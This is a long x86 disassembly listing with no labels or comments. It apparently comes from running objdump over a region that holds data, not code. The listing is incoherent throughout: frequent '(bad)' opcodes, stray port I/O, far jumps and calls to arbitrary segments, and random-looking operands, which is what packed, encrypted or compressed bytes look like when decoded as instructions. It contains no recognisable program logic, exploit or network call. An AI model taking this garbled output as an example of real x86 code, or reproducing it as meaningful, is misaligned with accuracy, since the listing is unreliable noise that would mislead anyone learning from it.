  4184bb:	fild   WORD PTR [ecx]
  4184bd:	inc    ebx
  4184be:	frstor [eax+0x1ebeb1a4]
  4184c4:	add    eax,0xe7d91030
  4184c9:	inc    ecx
  4184ca:	or     eax,0xa666d09e
  4184cf:	outs   dx,BYTE PTR ds:[esi]
  4184d0:	adc    al,0xd8
  4184d2:	imul   DWORD PTR [edx+0x78ec1e21]
  4184d8:	cmp    al,0x1b
  4184da:	inc    esi
  4184db:	add    BYTE PTR [eax+0x46],ch
  4184de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184df:	addr16 iret 
  4184e1:	push   esp
  4184e2:	inc    ecx
  4184e3:	mov    ah,BYTE PTR [esi-0x7efeb8f]
  4184e9:	mov    dh,0x9b
  4184eb:	(bad)  
  4184ec:	into   
  4184ed:	push   cs
  4184ee:	sub    bl,bl
  4184f0:	test   DWORD PTR [ebp-0x5b],0x1b3f8b1c
  4184f7:	sub    al,BYTE PTR [edx+eax*8]
  4184fa:	fisub  DWORD PTR [edi]
  4184fc:	push   edx
  4184fd:	loopne 0x4184dd
  4184ff:	(bad)  
  418501:	sbb    al,0x80
  418503:	pusha  
  418504:	retf   0x468c
  418507:	and    al,0xfa
  418509:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41850a:	test   BYTE PTR ds:0x8e6ccd3f,dh
  418510:	and    bl,BYTE PTR [esi]
  418512:	loope  0x4184b6
  418514:	sub    DWORD PTR [ecx-0x2f],ebx
  418517:	mov    bl,0x10
  418519:	jo     0x4184af
  41851b:	enter  0x809d,0x3b
  41851f:	fsub   DWORD PTR [edi+esi*2+0x4a]
  418523:	bound  edi,QWORD PTR [esi+0xc]
  418526:	mov    ds:0x2e414b06,eax
  41852b:	ja     0x4184f2
  41852d:	xchg   BYTE PTR [ecx],ch
  41852f:	add    BYTE PTR [ecx],bl
  418531:	jb     0x4185b0
  418533:	fcmovne st,st(6)
  418535:	and    eax,0x7842a024
  41853a:	in     al,0x5c
  41853c:	add    ebp,DWORD PTR [edi]
  41853e:	loopne 0x418522
  418540:	jo     0x418508
  418542:	jge    0x41853b
  418544:	push   eax
  418545:	pop    esp
  418546:	pop    es
  418547:	push   ecx
  418548:	and    dl,BYTE PTR [esi+0x6b46e70e]
  41854e:	and    DWORD PTR [eax*4+0x731a6c5b],eax
  418555:	rcl    DWORD PTR [eax-0x5610965f],1
  41855b:	lods   al,BYTE PTR cs:[esi]
  41855d:	dec    ebx
  41855e:	aam    0x8a
  418560:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418561:	sbb    DWORD PTR [esi-0x1743ee7a],esp
  418567:	nop
  418568:	(bad)  
  418569:	retf   
  41856a:	scas   eax,DWORD PTR es:[edi]
  41856b:	inc    esi
  41856c:	add    DWORD PTR [ebx-0x7f],ecx
  41856f:	rcr    BYTE PTR [ecx-0x6a02019c],0x50
  418576:	scas   eax,DWORD PTR es:[edi]
  418577:	sub    ah,BYTE PTR [ecx+0x5f6938bf]
  41857d:	outs   dx,DWORD PTR ds:[esi]
  41857e:	add    bl,BYTE PTR [ebp+esi*8+0x60b53e20]
  418585:	fadd   st(4),st
  418587:	dec    ebp
  418588:	mov    edx,0xecb63236
  41858d:	js     0x4185c9
  41858f:	dec    esp
  418590:	sub    al,0x8
  418592:	inc    ebx
  418593:	dec    esp
  418594:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418595:	and    ebx,ebp
  418597:	push   0x2c
  418599:	loop   0x418550
  41859b:	sub    BYTE PTR [ecx+0x40],ch
  41859e:	test   BYTE PTR [edi],cl
  4185a0:	push   cs
  4185a1:	aam    0xaf
  4185a3:	cmp    eax,DWORD PTR [ebx]
  4185a5:	lea    esi,[ebx+0xa4015ed]
  4185ab:	lock xchg ebx,eax
  4185ad:	push   0x59
  4185af:	repnz push cs
  4185b1:	or     al,0xd9
  4185b3:	adc    DWORD PTR [edi],0xd4ad4c94
  4185b9:	cmp    dh,BYTE PTR [ebx-0x4bb16ba3]
  4185bf:	ret    
  4185c0:	jmp    0x459b6bc4
  4185c5:	xchg   BYTE PTR [ebx+ebp*4+0x28643fc6],ch
  4185cc:	aas    
  4185cd:	jmp    0xdc96:0x8c8ba4c5
  4185d4:	inc    eax
  4185d5:	adc    al,0x93
  4185d7:	jns    0x418655
  4185d9:	push   es
  4185da:	inc    esp
  4185db:	pop    esi
  4185dc:	das    
  4185dd:	aam    0x4f
  4185df:	pushw  ds
  4185e1:	add    cl,BYTE PTR [ecx+0x1d]
  4185e4:	pop    edx
  4185e5:	sar    DWORD PTR [ebp+0x30],cl
  4185e8:	xchg   edi,eax
  4185e9:	ja     0x41860d
  4185eb:	shl    esp,0x39
  4185ee:	stos   DWORD PTR es:[edi],eax
  4185ef:	inc    ebx
  4185f0:	and    cl,al
  4185f2:	sahf   
  4185f3:	xchg   esi,eax
  4185f4:	(bad)  
  4185f5:	shl    DWORD PTR [edx+ecx*4-0x3],cl
  4185f9:	popf   
  4185fa:	mov    ds:0xac2b23b1,eax
  4185ff:	lods   eax,DWORD PTR ds:[esi]
  418600:	or     BYTE PTR [edx+esi*1],ah
  418603:	scas   al,BYTE PTR es:[edi]
  418604:	adc    edi,0xffffff95
  418607:	dec    ecx
  418608:	mov    edx,0xc15a2969
  41860d:	mov    ah,0xdc
  41860f:	sub    eax,0x7a8f7e70
  418614:	pop    ebp
  418615:	sub    al,0x1e
  418617:	xor    WORD PTR [esi-0x7d],si
  41861b:	pop    edx
  41861c:	mov    ds:0xab7fa296,al
  418621:	jle    0x4185ed
  418623:	fdivrp st(0),st
  418625:	jmp    0x4185ce
  418627:	mov    ah,0xb3
  418629:	jle    0x418683
  41862b:	or     esi,ebp
  41862d:	mov    esi,0x54a561f9
  418632:	adc    eax,0x185ce3ea
  418637:	mov    edx,0x783c1e56
  41863c:	int    0x4a
  41863e:	retf   0x3745
  418641:	pop    esi
  418642:	leave  
  418643:	push   0xa26b28bd
  418648:	fld    QWORD PTR [ebx+0x6]
  41864b:	mov    bl,0xdc
  41864d:	mov    DWORD PTR [ebp-0x37f78852],ebx
  418653:	jp     0x418668
  418655:	sbb    ch,BYTE PTR ds:0x7f7b1d1f
  41865b:	retf   0x993b
  41865e:	pushf  
  41865f:	cmp    dl,BYTE PTR [edi-0x6c]
  418662:	dec    esi
  418663:	inc    ebp
  418664:	mov    bl,BYTE PTR [edi+0x19]
  418667:	cmp    eax,0xbb1f4637
  41866c:	ss cld 
  41866e:	push   edx
  41866f:	cmp    eax,edx
  418671:	jmp    0xbae1:0x6f039e73
  418678:	sbb    bl,0x17
  41867b:	mov    dl,0xac
  41867d:	and    eax,0xbe8faa2f
  418682:	sbb    al,cl
  418684:	in     eax,dx
  418685:	mov    ebx,0x299f2138
  41868a:	pop    eax
  41868b:	or     DWORD PTR [edi+0x6d7a9901],ecx
  418691:	mov    ecx,0x70d45a77
  418696:	add    esp,edi
  418698:	jmp    0x7099:0x45ae128f
  41869f:	push   eax
  4186a0:	enter  0xc11f,0xc6
  4186a4:	call   0x2933:0x16404487
  4186ab:	adc    DWORD PTR [ecx+0x12932029],eax
  4186b1:	push   cs
  4186b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186b3:	in     al,dx
  4186b4:	arpl   WORD PTR [edx-0x5b],sp
  4186b7:	jns    0x4186a4
  4186b9:	push   0x3ebc4dab
  4186be:	and    esi,ebp
  4186c0:	lods   al,BYTE PTR ds:[esi]
  4186c1:	mov    al,ds:0x7fc97712
  4186c6:	mov    ds:0x2a186ade,al
  4186cb:	pop    ds
  4186cc:	mov    DWORD PTR [ebp+0x7c],eax
  4186cf:	cmp    eax,0x53120cca
  4186d4:	jge    0x4186c3
  4186d6:	push   ecx
  4186d7:	push   esi
  4186d8:	addr16 or bh,dl
  4186db:	xlat   BYTE PTR ds:[ebx]
  4186dc:	add    BYTE PTR [edi+0x35],bl
  4186df:	add    DWORD PTR [ecx+eax*8+0x4d484b09],eax
  4186e6:	sti    
  4186e7:	jns    0x41868f
  4186e9:	sbb    eax,DWORD PTR [ecx+0x5812523]
  4186ef:	or     al,0x4f
  4186f1:	xchg   edi,eax
  4186f2:	mov    edx,0xe2947c2d
  4186f7:	outs   dx,BYTE PTR ds:[esi]
  4186f8:	pushf  
  4186f9:	scas   al,BYTE PTR es:[edi]
  4186fa:	sbb    BYTE PTR [edi+ecx*8+0x390ea27b],bl
  418701:	pop    edx
  418702:	pop    edx
  418703:	ss or  al,0x28
  418706:	mov    ds:0xbed62162,eax
  41870b:	js     0x4186b9
  41870d:	jmp    0x418694
  41870f:	mov    WORD PTR ds:0xf3ef2d09,?
  418715:	cmp    BYTE PTR gs:[edx-0x37],dh
  418719:	pop    es
  41871a:	push   eax
  41871b:	mov    ebp,0x77d3cd74
  418720:	cwde   
  418721:	push   ebp
  418722:	xchg   edi,eax
  418723:	jle    0x418763
  418725:	retf   
  418726:	scas   al,BYTE PTR es:[edi]
  418727:	fld    TBYTE PTR [edi]
  418729:	out    dx,eax
  41872a:	mov    dh,0x0
  41872c:	and    al,0xfe
  41872e:	sub    BYTE PTR [ecx-0x5b],al
  418731:	rcl    ebx,cl
  418733:	addr16 ror ebx,0x9d
  418737:	mov    edx,edx
  418739:	jmp    0x44e1be97
  41873e:	fcmovnu st,st(1)
  418740:	jge    0x4187a2
  418742:	(bad)  
  418743:	sbb    eax,0x4266d6de
  418748:	pop    ecx
  418749:	dec    ecx
  41874a:	inc    eax
  41874b:	and    DWORD PTR [esi+esi*2+0x20ef56bc],edx
  418752:	shl    eax,1
  418754:	add    al,0x3d
  418756:	mov    di,0x78e6
  41875a:	mov    ds:0x2b45300f,eax
  41875f:	pop    edx
  418760:	sbb    al,0x8d
  418762:	mov    BYTE PTR [edi-0x73565b1c],0x32
  418769:	and    bh,BYTE PTR [esi-0x78]
  41876c:	stc    
  41876d:	mov    al,ds:0xd19b3602
  418772:	mov    gs,WORD PTR [edi]
  418774:	in     al,dx
  418775:	jnp    0x4187be
  418777:	gs add eax,0x2b0cda9d
  41877d:	and    eax,0xfdbf5848
  418782:	cmp    ebp,DWORD PTR [esi]
  418784:	lahf   
  418785:	mov    dh,0x5d
  418787:	mov    ebp,0x7630a65e
  41878c:	ret    0xf0c3
  41878f:	push   esi
  418790:	add    DWORD PTR [edi+0x2b],ebp
  418793:	xchg   esp,eax
  418794:	adc    DWORD PTR [ecx+0x4b],eax
  418797:	mov    WORD PTR [ebx],ss
  418799:	mov    edi,0xc82fdf91
  41879e:	jnp    0x4187e3
  4187a0:	je     0x4187cb
  4187a2:	lods   al,BYTE PTR ds:[esi]
  4187a3:	cmp    ebx,DWORD PTR [esi+0x25]
  4187a6:	adc    eax,DWORD PTR [eax+ecx*8+0xc]
  4187aa:	jbe    0x41880a
  4187ac:	cmc    
  4187ad:	dec    ebp
  4187ae:	sbb    eax,ebx
  4187b0:	arpl   WORD PTR ds:0xb3c765c7,di
  4187b6:	test   DWORD PTR [edx],ebx
  4187b8:	dec    ebp
  4187b9:	mov    dh,0xbe
  4187bb:	lods   al,BYTE PTR ds:[esi]
  4187bc:	test   DWORD PTR [eax-0x7171ea21],eax
  4187c2:	sub    edi,DWORD PTR [ecx+0x419e4c64]
  4187c8:	mov    ebx,0x67394047
  4187cd:	pop    edi
  4187ce:	retf   0x64ba
  4187d1:	sub    eax,ebx
  4187d3:	sbb    BYTE PTR [esi+ecx*8],cl
  4187d6:	or     DWORD PTR [edi-0xe],esp
  4187d9:	out    dx,al
  4187da:	cmp    eax,DWORD PTR [ebx+0x10443a21]
  4187e0:	sbb    esi,DWORD PTR [ecx-0x78d49019]
  4187e6:	inc    edi
  4187e7:	pop    es
  4187e8:	iret   
  4187e9:	les    ecx,FWORD PTR [eax-0x28]
  4187ec:	mov    eax,0x39210248
  4187f1:	test   DWORD PTR [edx+0x69b552d2],edx
  4187f7:	adc    BYTE PTR [ebp-0x4],ah
  4187fa:	inc    edx
  4187fb:	out    0x64,al
  4187fd:	out    0x47,eax
  4187ff:	(bad)
  418802:	pop    es
  418803:	or     DWORD PTR [edx],esi
  418805:	sbb    al,BYTE PTR [ebx-0x2066b26f]
  41880b:	lods   al,BYTE PTR ds:[esi]
  41880c:	push   esp
  41880d:	jb     0x4187bd
  41880f:	out    0x2e,eax
  418811:	and    DWORD PTR [ecx+esi*8],esp
  418814:	mov    al,ds:0x12a505d4
  418819:	lods   al,BYTE PTR ds:[esi]
  41881a:	(bad)
  41881d:	pop    esp
  41881e:	and    al,BYTE PTR [esi+eax*8+0x52]
  418822:	aam    0x57
  418824:	mov    eax,0x4c45acb9
  418829:	sbb    esi,DWORD PTR [esi]
  41882b:	sub    ah,ch
  41882d:	cmp    edx,0x2abd0d9e
  418833:	stos   BYTE PTR es:[edi],al
  418834:	rol    BYTE PTR [ecx+0x75979e0a],1
  41883a:	cdq    
  41883b:	push   ecx
  41883c:	(bad)  
  41883d:	aad    0xdc
  41883f:	pop    ds
  418840:	(bad)  
  418841:	cmp    bl,BYTE PTR [esi+0x71a77034]
  418847:	adc    DWORD PTR [ebp+ebp*4+0x0],edx
  41884b:	jno    0x418875
  41884d:	shr    DWORD PTR [edi-0x25b15981],0x2
  418854:	dec    esi
  418855:	mov    ecx,0xa6ec374e
  41885a:	into   
  41885b:	aam    0xcc
  41885d:	repz ficom WORD PTR [ecx+edx*2]
  418861:	iret   
  418862:	sub    BYTE PTR [ebx-0x33],bh
  418865:	or     eax,0xfda93b56
  41886a:	loope  0x4188a6
  41886c:	dec    esi
  41886d:	vpunpcklqdq xmm0,xmm1,XMMWORD PTR [edi+0x5d58652a]
  418875:	xor    DWORD PTR [eax-0x64],0xffffffc1
  418879:	rcr    DWORD PTR [ecx-0xd83465e],0xbf
  418880:	sub    edx,DWORD PTR [edi]
  418882:	(bad)  
  418884:	stos   DWORD PTR es:[edi],eax
  418885:	add    eax,0x6004d5aa
  41888a:	push   ds
  41888b:	data16 add cl,BYTE PTR [ebp+0xf]
  41888f:	lea    edi,[ebx-0x32b141ab]
  418895:	mov    WORD PTR [ebp+0x792f13a6],ss
  41889b:	pop    esp
  41889c:	or     eax,0x1db1c172
  4188a1:	out    0x1b,al
  4188a3:	mov    eax,ds:0x25696556
  4188a8:	xchg   ebx,eax
  4188a9:	(bad)  
  4188aa:	jnp    0x41889d
  4188ac:	mov    esp,0x394481b7
  4188b1:	jnp    0x4188db
  4188b3:	xchg   esi,eax
  4188b4:	lds    ecx,FWORD PTR [eax-0x259d8f28]
  4188ba:	push   ecx
  4188bb:	cmp    al,0x63
  4188bd:	mov    DWORD PTR [ebx+0x5edf5755],0x487d937
  4188c7:	fstp   QWORD PTR ds:0x36e211c7
  4188cd:	cld    
  4188ce:	sbb    DWORD PTR [edi-0x76],eax
  4188d1:	mov    BYTE PTR [ebp-0x59e2e805],cl
  4188d7:	dec    esi
  4188d8:	(bad)  
  4188d9:	adc    BYTE PTR [ebp-0x24],ah
  4188dc:	mov    ebp,0x598a5761
  4188e1:	mov    bl,0xe
  4188e3:	in     al,0x77
  4188e5:	pop    ss
  4188e6:	fwait
  4188e7:	mov    dh,0x46
  4188e9:	mov    WORD PTR [ebx+eax*8-0x26c1de29],?
  4188f0:	retf   
  4188f1:	or     al,BYTE PTR [edx+0x112d153c]
  4188f7:	xchg   ecx,eax
  4188f8:	cmp    DWORD PTR [edx],0x528b21e5
  4188fe:	pop    ss
  4188ff:	push   ecx
  418900:	mov    ss,WORD PTR ds:0x58b2d498
  418906:	dec    esp
  418907:	mov    ds:0x9ac874ba,al
  41890c:	or     BYTE PTR ds:0x8e1f7db8,bl
  418912:	ror    DWORD PTR [eax-0x20],1
  418915:	push   ecx
  418916:	lahf   
  418917:	rcl    ah,1
  418919:	pop    ss
  41891a:	or     al,bh
  41891c:	add    al,0xb8
  41891e:	pop    esi
  41891f:	fisubr DWORD PTR [edx]
  418921:	ss stos BYTE PTR es:[edi],al
  418923:	iret   
  418924:	jp     0x41893e
  418926:	aaa    
  418927:	dec    ebx
  418928:	aam    0xf2
  41892a:	dec    esi
  41892b:	test   ebx,0xe4f7b522
  418931:	xchg   ecx,eax
  418932:	mov    edi,0x3f4aa816
  418937:	sar    DWORD PTR [ebx+0x7f],cl
  41893a:	lea    edi,[edi]
  41893c:	add    dl,BYTE PTR [ebp+0x20]
  41893f:	je     0x41898c
  418941:	loop   0x41890f
  418943:	cld    
  418944:	inc    ebx
  418945:	xor    al,0xca
  418947:	pop    ds
  418948:	add    al,0x31
  41894a:	mov    WORD PTR [edx],ds
  41894c:	jbe    0x4188ee
  41894e:	or     DWORD PTR [edi+0x0],ebx
  418951:	or     eax,0xf75eb33
  418956:	call   0xb0480b4f
  41895b:	xor    al,0x74
  41895d:	mul    BYTE PTR [esi-0x62]
  418960:	mov    dl,0x29
  418962:	adc    BYTE PTR [edi+0xa],0xfe
  418966:	jo     0x4188f8
  418968:	fcom   DWORD PTR [edi]
  41896a:	fnstcw WORD PTR [ebp+0x10aa02ee]
  418970:	sub    eax,0x2b8992ab
  418975:	stc    
  418976:	loope  0x41890e
  418978:	dec    ecx
  418979:	xor    dl,dl
  41897b:	scas   al,BYTE PTR es:[edi]
  41897c:	adc    DWORD PTR [ecx+0x2c111fe4],ebx
  418982:	(bad)  
  418983:	xchg   edi,eax
  418984:	cmp    eax,0xc28d8bd9
  418989:	xchg   BYTE PTR [esi],cl
  41898b:	into   
  41898c:	inc    ebp
  41898d:	mov    cl,0x28
  41898f:	adc    DWORD PTR [ebp+0x17],edi
  418992:	sub    eax,0x55022570
  418997:	std    
  418998:	nop
  418999:	jge    0x418a17
  41899b:	mov    edi,0x109d1be2
  4189a0:	push   ds
  4189a1:	and    BYTE PTR [ebx-0x2c],ch
  4189a4:	push   ecx
  4189a5:	ss aad 0x8e
  4189a8:	add    eax,ebx
  4189aa:	in     al,0xdd
  4189ac:	stos   DWORD PTR es:[edi],eax
  4189ad:	ja     0x418945
  4189af:	jp     0x418a1e
  4189b1:	mov    ds:0x74d904cc,eax
  4189b6:	aam    0x8
  4189b8:	(bad)  
  4189b9:	fisub  DWORD PTR [edi+edi*4+0x1565a3b6]
  4189c0:	add    BYTE PTR [ecx],ah
  4189c2:	add    edx,DWORD PTR ds:0xfb346821
  4189c8:	inc    edi
  4189c9:	int    0x75
  4189cb:	or     dh,BYTE PTR [ebx+0xca81bbd]
  4189d1:	xchg   esp,eax
  4189d2:	fadd   DWORD PTR [ebp+0xc79c881]
  4189d8:	dec    esi
  4189d9:	xchg   ecx,eax
  4189da:	mov    eax,ds:0x1f17bfec
  4189df:	pop    ebx
  4189e0:	add    cl,ch
  4189e2:	les    ecx,FWORD PTR [di+0xcb6]
  4189e7:	sub    DWORD PTR [ecx+0x3a],edx
  4189ea:	sbb    DWORD PTR [edi],esp
  4189ec:	retf   0x4a84
  4189ef:	sub    eax,0xf1649de0
  4189f4:	sbb    eax,0xc570abf8
  4189f9:	cmp    esp,DWORD PTR [ebx-0x4b06dd3]
  4189ff:	add    BYTE PTR [eax-0xc57f77a],0xf9
  418a06:	xchg   DWORD PTR [esi+0x23827f18],ecx
  418a0c:	retf   0x27b0
  418a0f:	add    DWORD PTR ds:[esi+ebp*1],ecx
  418a13:	add    dl,BYTE PTR [eax+ecx*1-0x2828ca90]
  418a1a:	lds    esp,FWORD PTR [esi]
  418a1c:	(bad)  
  418a1d:	in     al,0x63
  418a1f:	mov    esp,0x1bdfcbbc
  418a24:	outs   dx,DWORD PTR ds:[esi]
  418a25:	div    BYTE PTR [esi+0x24be83cd]
  418a2b:	(bad)  
  418a2c:	fwait
  418a2d:	sbb    BYTE PTR [edx-0x40],bh
  418a30:	cdq    
  418a31:	xchg   esi,eax
  418a32:	and    cl,BYTE PTR [edx+0x306a55c9]
  418a38:	push   ecx
  418a39:	retf   
  418a3a:	dec    edi
  418a3b:	xchg   esp,eax
  418a3c:	pusha  
  418a3d:	daa    
  418a3e:	sbb    BYTE PTR [ecx-0x3341cb3c],ah
  418a44:	call   0x3a08:0xdab128dc
  418a4b:	retf   
  418a4c:	cmc    
  418a4d:	fidiv  WORD PTR [eax+0x6b]
  418a50:	adc    BYTE PTR [ebp-0x34dde0fa],dh
  418a56:	pop    ss
  418a57:	sbb    esp,DWORD PTR ds:[ecx]
  418a5a:	xchg   ecx,eax
  418a5b:	xor    DWORD PTR [ecx+0x6e],edi
  418a5e:	sbb    DWORD PTR [edi+0x46],ebx
  418a61:	or     eax,0xe0547251
  418a66:	lods   al,BYTE PTR ds:[esi]
  418a67:	and    al,0x10
  418a69:	mov    ch,0xc0
  418a6b:	jae    0x418ac0
  418a6d:	xor    DWORD PTR [ebx+eax*1-0x18],edi
  418a71:	adc    eax,0x869cc4ad
  418a76:	mov    al,ds:0x9015715b
  418a7b:	sar    ecx,0x48
  418a7e:	or     BYTE PTR [eax+0xf4982b2],bl
  418a84:	mov    cl,dh
  418a86:	cmp    DWORD PTR [edx],0x4abc0dab
  418a8c:	dec    ebx
  418a8d:	lds    ebx,FWORD PTR [edx]
  418a8f:	push   es
  418a90:	pop    ebx
  418a91:	out    0x9a,al
  418a93:	sar    ch,1
  418a95:	dec    esp
  418a96:	sbb    ch,cl
  418a98:	jmp    0x5245da59
  418a9d:	pushf  
  418a9e:	add    eax,0x78dfb6bc
  418aa3:	jno    0x418b16
  418aa5:	mov    ah,0xde
  418aa7:	push   es
  418aa8:	popf   
  418aa9:	add    al,0xd5
  418aab:	lods   eax,DWORD PTR ds:[esi]
  418aac:	xchg   BYTE PTR [eax+edi*2+0x61],dh
  418ab0:	mov    ch,0x4
  418ab2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ab3:	xchg   DWORD PTR [edi-0xf],ebx
  418ab6:	das    
  418ab7:	dec    esi
  418ab8:	pushf  
  418ab9:	std    
  418aba:	xchg   ecx,eax
  418abb:	shl    esp,1
  418abd:	scas   al,BYTE PTR es:[edi]
  418abe:	push   0x1019f969
  418ac3:	cmp    BYTE PTR [edi+0x25fa3a1b],bl
  418ac9:	pop    es
  418aca:	ja     0x418aba
  418acc:	jns    0x418ab4
  418ace:	loope  0x418a80
  418ad0:	mov    ds,ebx
  418ad2:	imul   eax,DWORD PTR [ebx],0x69
  418ad5:	push   esi
  418ad6:	push   ss
  418ad7:	jecxz  0x418b36
  418ad9:	jno    0x418b2f
  418adb:	dec    ecx
  418adc:	jmp    0x213e1cb9
  418ae1:	imul   ebx,DWORD PTR [edi-0x4bc409cf],0xa0f51e8f
  418aeb:	jge    0x418b1d
  418aed:	(bad)  
  418aee:	xchg   ebp,eax
  418aef:	mov    al,ds:0x18ed545a
  418af4:	cs jle 0x418adc
  418af7:	not    esp
  418af9:	(bad)  
  418afa:	jne    0x418b09
  418afc:	or     al,BYTE PTR [edx+0x347e64e]
  418b02:	inc    eax
  418b03:	xor    al,0x91
  418b05:	or     esi,DWORD PTR [edx-0x3f263cf9]
  418b0b:	aad    0x9a
  418b0d:	enter  0x5bef,0x1f
  418b11:	jge    0x418b55
  418b13:	and    eax,0xb27d6540
  418b18:	test   BYTE PTR [esi+0x6d],bh
  418b1b:	mov    dh,0xf9
  418b1d:	ja     0x418b0b
  418b1f:	enter  0xe05f,0x36
  418b23:	in     eax,dx
  418b24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b25:	out    0x62,eax
  418b27:	imul   eax,DWORD PTR [eax+0x52da6f85],0xab2a9177
  418b31:	mov    ecx,0x979e887f
  418b36:	mov    esi,0xb5ac910e
  418b3b:	pusha  
  418b3c:	push   eax
  418b3d:	pop    esp
  418b3e:	mov    DWORD PTR [edx+ebp*4],0x8529e57f
  418b45:	lea    ebx,[ecx]
  418b47:	shr    BYTE PTR ss:[ecx+0x1b],1
  418b4b:	sti    
  418b4c:	xor    cl,bh
  418b4e:	inc    edx
  418b4f:	push   es
  418b50:	mov    cl,0xaf
  418b52:	cdq    
  418b53:	pop    es
  418b54:	mul    DWORD PTR [edi+edi*8]
  418b57:	inc    edi
  418b58:	add    al,0x37
  418b5a:	mov    ch,0xf7
  418b5c:	sbb    eax,0xa3be9f3b
  418b61:	push   esp
  418b62:	test   BYTE PTR [ebp+0x6a1de684],cl
  418b68:	push   esi
  418b69:	push   DWORD PTR [ecx-0x4e08b4a9]
  418b6f:	mov    dl,0x9b
  418b71:	lea    esp,[edi+0x55c92a4b]
  418b77:	sub    al,0x7c
  418b79:	stc    
  418b7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b7b:	adc    DWORD PTR [edi-0x44],eax
  418b7e:	sub    dl,BYTE PTR [ebx]
  418b80:	ja     0x418bc9
  418b82:	imul   eax,DWORD PTR [ecx],0x170f27af
  418b88:	bound  eax,QWORD PTR [eax]
  418b8a:	mov    ch,0xc0
  418b8c:	in     eax,dx
  418b8d:	push   0xffffffe1
  418b8f:	bound  ebp,QWORD PTR [ecx-0x77a3c961]
  418b95:	add    al,al
  418b97:	mov    edx,0xdc61a2b9
  418b9c:	out    dx,al
  418b9d:	mov    al,0x6f
  418b9f:	call   0x6bfc:0x37ba68bf
  418ba6:	add    ebp,DWORD PTR [edi]
  418ba8:	push   es
  418ba9:	fldenv [eax+0x29]
  418bac:	cs ja  0x418b83
  418baf:	cmc    
  418bb0:	adc    bh,cl
  418bb2:	cmp    DWORD PTR [edx+0x3e33b66e],ebx
  418bb8:	lea    eax,[esi+eax*1+0x606d37e7]
  418bbf:	lods   al,BYTE PTR ds:[esi]
  418bc0:	jo     0x418bba
  418bc2:	push   ecx
  418bc3:	adc    cl,BYTE PTR [ebx-0x9a85b92]
  418bc9:	xchg   esp,eax
  418bca:	push   esi
  418bcb:	and    BYTE PTR [ecx],dl
  418bcd:	sbb    BYTE PTR [edx-0x1dbb27fc],cl
  418bd3:	loope  0x418c48
  418bd5:	sub    al,0x7b
  418bd7:	or     bh,dh
  418bd9:	push   edi
  418bda:	sub    edx,DWORD PTR ds:0xef0bcd36
  418be0:	jnp    0x418bb9
  418be2:	shl    BYTE PTR [ebx+0x55b1f5e3],0x70
  418be9:	push   cs
  418bea:	stc    
  418beb:	mov    dl,0x5d
  418bed:	rcr    DWORD PTR [esi-0x25],0x29
  418bf1:	and    al,BYTE PTR [ebp-0x7eef7f92]
  418bf7:	push   0x58c2d167
  418bfc:	repz push ds
  418bfe:	data16 fsubrp st(0),st
  418c01:	cli    
  418c02:	pop    esp
  418c03:	add    dl,al
  418c05:	pop    ebp
  418c06:	xchg   ebp,eax
  418c07:	xchg   edi,eax
  418c08:	ins    BYTE PTR es:[edi],dx
  418c09:	popf   
  418c0a:	adc    ebp,0xe940db40
  418c10:	mov    edx,0x41db47bf
  418c15:	pop    edx
  418c16:	lods   al,BYTE PTR ds:[esi]
  418c17:	fistp  QWORD PTR [ecx-0x11d1de64]
  418c1d:	or     DWORD PTR [edx-0x68],eax
  418c20:	jge    0x418bfb
  418c22:	ret    
  418c23:	mov    edi,0xe4329f80
  418c28:	push   edi
  418c29:	sub    DWORD PTR [ebp-0x2a00a27e],esi
  418c2f:	adc    ah,BYTE PTR es:[ecx-0x6aaa2805]
  418c36:	enter  0xa9e1,0x1d
  418c3a:	loopne 0x418c46
  418c3c:	push   ds
  418c3d:	and    BYTE PTR [esi+0x1ccf2339],0xb2
  418c44:	jmp    0x681a5b00
  418c49:	sti    
  418c4a:	cwde   
  418c4b:	cmp    eax,0xc1a8475f
  418c50:	sbb    eax,0xb0e3677b
  418c55:	mov    eax,0xf586718f
  418c5a:	mov    WORD PTR [ecx+edi*1+0x74692b4a],ss
  418c61:	cwde   
  418c62:	mov    edi,ebx
  418c64:	clc    
  418c65:	in     al,0xa7
  418c67:	ss or  bl,ch
  418c6a:	ss ins BYTE PTR es:[edi],dx
  418c6c:	leave  
  418c6d:	add    eax,0x4a2a2b36
  418c73:	ret    0xcca9
  418c76:	dec    ebx
  418c77:	retf   0x9961
  418c7a:	pop    esp
  418c7b:	xor    ah,0x31
  418c7e:	popa   
  418c7f:	and    DWORD PTR ds:0x21832d8b,edx
  418c85:	sar    edx,cl
  418c87:	pop    ebx
  418c88:	xchg   BYTE PTR [edi],cl
  418c8a:	lahf   
  418c8b:	iret   
  418c8c:	or     eax,0xc9436f14
  418c91:	mov    ebx,0x780f0563
  418c96:	and    eax,0xe0185bb
  418c9b:	aas    
  418c9c:	pusha  
  418c9d:	dec    ebx
  418c9e:	mov    DWORD PTR [edi],0xf906fd2
  418ca4:	jns    0x418ca6
  418ca6:	ror    DWORD PTR [edx-0x56cd8829],1
  418cac:	xor    dl,BYTE PTR [ebx+0x58]
  418caf:	sahf   
  418cb0:	lods   eax,DWORD PTR ds:[esi]
  418cb1:	js     0x418cfc
  418cb3:	jbe    0x418c8c
  418cb5:	loopne 0x418c76
  418cb7:	int    0xc2
  418cb9:	xchg   esi,eax
  418cba:	ins    DWORD PTR es:[edi],dx
  418cbb:	scas   eax,DWORD PTR es:[edi]
  418cbc:	fmul   QWORD PTR [edx]
  418cbe:	jo     0x418d3c
  418cc0:	jmp    0xe6dd:0x7212fd18
  418cc7:	xor    bh,0x4a
  418cca:	push   eax
  418ccb:	inc    ebx
  418ccc:	test   eax,0xe8592089
  418cd1:	xchg   DWORD PTR [ebx+0x175f105d],ebx
  418cd7:	(bad)  
  418cd8:	jg     0x418ce7
  418cda:	jp     0x418c92
  418cdc:	push   esi
  418cdd:	fucom  st(1)
  418cdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ce0:	ret    
  418ce1:	(bad)  
  418ce2:	(bad)  
  418ce3:	std    
  418ce4:	xchg   ecx,eax
  418ce5:	adc    al,0x52
  418ce7:	dec    esp
  418ce8:	xchg   edx,eax
  418ce9:	mov    eax,ds:0x640aedb1
